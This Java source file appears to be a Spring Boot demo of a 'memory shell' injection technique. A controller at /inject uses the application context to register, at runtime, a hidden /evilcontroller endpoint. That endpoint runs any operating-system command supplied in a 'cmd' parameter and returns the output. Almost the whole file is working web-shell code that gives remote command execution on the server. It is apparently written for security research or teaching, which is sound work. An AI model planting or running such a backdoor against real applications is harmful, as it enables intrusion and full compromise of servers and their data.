package com.example.springmem.demos.web;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.Scanner;

/**
 * @ClassName: evil
 * @Auther: niko
 * @Date: 2024/9/19 17:18
 * @Description:
 */
@RestController
public class evil {
    @RequestMapping("/inject")
    public String cmd() throws NoSuchMethodException {

        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        PatternsRequestCondition url = new PatternsRequestCondition("/evilcontroller");
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        Method method = evilMethod.class.getMethod("cmd");
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        evilMethod evilMethod = new evilMethod();
        mappingHandlerMapping.registerMapping(info,evilMethod,method);
//        AbstractHandlerMethodMapping.BEST_MATCHING_HANDLER_ATTRIBUTE
        return "Inject done";
    }
    @RestController
    public class evilMethod{
        public evilMethod(){}
        public void cmd(){
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();

            String[] cmd;
            String os = System.getProperty("os.name");
            cmd = os.toLowerCase().contains("win")?new String[]{"cmd","/c",request.getParameter("cmd")}:new String[]{"sh","-c",request.getParameter("cmd")};
            try {
                Process exec = Runtime.getRuntime().exec(cmd);
                InputStream inputStream = exec.getInputStream();
                Scanner s = new Scanner(inputStream).useDelimiter("\\A");
                String output = s.hasNext()?s.next():"";
                response.getWriter().write(output);
                response.getWriter().flush();
                response.getWriter().close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }

    }

}
